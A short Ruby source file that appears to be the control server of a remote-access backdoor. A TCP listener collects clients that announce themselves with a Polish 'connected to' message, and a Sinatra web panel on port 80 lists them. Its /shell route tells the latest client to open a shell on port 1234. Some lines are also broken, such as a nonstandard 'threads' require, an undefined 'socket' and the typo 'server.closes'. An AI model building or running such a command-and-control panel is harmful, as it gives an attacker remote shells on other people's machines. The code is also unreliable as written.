require 'socket'
require 'sinatra'
require 'threads'

#TCP Server variables
$stdout.sync = true
server = TCPServer.new('127.0.0.1', 55555)

#Threads variables
$loopThread = Thread.new { sleep }
$semaphore = Mutex.new

#Global lists
pcList = []
$clientsList = []

class Client
  # @Instance variable
  # @@Class variable
  @@clientCount = 0
  attr_accessor :name
  attr_accessor :num

  def initialize(sockt)
    @sockt = sockt
    @num = @@clientCount
    @@clientCount += 1
  end

  def self.dead
    @@clientCount -= 1
  end

  def self.quantity
    return @@clientCount
  end

  def send(msg)
    @sockt.puts(msg)
  end
end

$loopThread = Thread.new {
  loop do
    Thread.start(server.accept) do |client|
      begin
        #Always need to synchronize global array
        $semaphore.synchronize { $clientsList << Client.new(client) }
        while line = client.gets
          if line[0..10] == "Polaczono z"
            pcList << line[12..-2]
            $semaphore.synchronize { $clientsList[(Client.quantity - 1)].name = line[12..-2] }
          end
        end
      rescue
        Client.dead
      end
    end
  end
  socket.close
  server.closes
}

class MyServer < Sinatra::Base

  configure do
    set :run            , 'true'
    set :public_folder  , 'public'
    set :views          , 'app/views'
    set :port           , '80'
    set :bind           , '0.0.0.0'
    set :show_exceptions, 'true' #Those are errors
  end

  get '/' do
      "We got #{Client.quantity} clients. #{$clientsList[(Client.quantity - 1)].name}"
  end

  get '/shell' do
    "Trying open shell on port 1234"
    $semaphore.synchronize { $clientsList[(Client.quantity - 1)].send("shell") }
  end

  run!
end
